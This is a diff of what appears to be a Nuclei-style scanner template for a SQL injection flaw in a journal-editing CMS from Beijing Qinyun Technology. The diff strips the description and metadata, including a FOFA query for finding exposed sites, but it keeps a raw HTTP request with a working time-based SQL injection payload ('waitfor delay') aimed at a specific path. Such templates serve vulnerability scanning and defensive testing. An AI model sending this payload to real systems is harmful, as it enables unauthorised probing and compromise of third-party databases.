@@ -3,12 +3,8 @@ info:
   name: 勤云科技期刊采编CMS存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ewg6vo5b1eqet37i'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ewg6vo5b1eqet37i
-    fofa: body="北京勤云科技"
 http:
 - raw:
   - 'GET /shhy''if%20db_name(1)=''master''%20waitfor%20delay%20''0:0:5''--/article/abstract/1 HTTP/1.1
